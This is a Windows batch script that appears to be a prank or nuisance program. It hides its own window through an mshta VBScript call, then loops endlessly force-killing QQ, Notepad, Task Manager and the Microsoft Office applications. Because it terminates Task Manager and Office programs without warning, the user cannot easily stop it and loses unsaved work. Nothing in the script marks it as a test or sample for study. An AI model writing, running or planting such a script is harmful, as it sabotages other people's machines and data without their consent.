@echo off
if "%1" == "h" goto begin
mshta vbscript:createobject("wscript.shell").run("""%~nx0"" h",0)(window.close)&&exit
:begin
REM

:kill
taskkill /f /im QQ.exe
taskkill /f /im notepad.exe
taskkill /f /im Taskmgr.exe
taskkill /f /im MSACCESS.EXE
taskkill /f /im EXCEL.EXE
taskkill /f /im OUTLOOK.EXE
taskkill /f /im POWERPNT.EXE
taskkill /f /im WINWORD.EXE
taskkill /f /im StormPlayer.exe
taskkill /f /im QQ.exe
taskkill /f /im QQ.exe
taskkill /f /im QQ.exe
taskkill /f /im QQ.exe
taskkill /f /im QQ.exe
taskkill /f /im QQ.exe
taskkill /f /im QQ.exe
taskkill /f /im QQ.exe

goto kill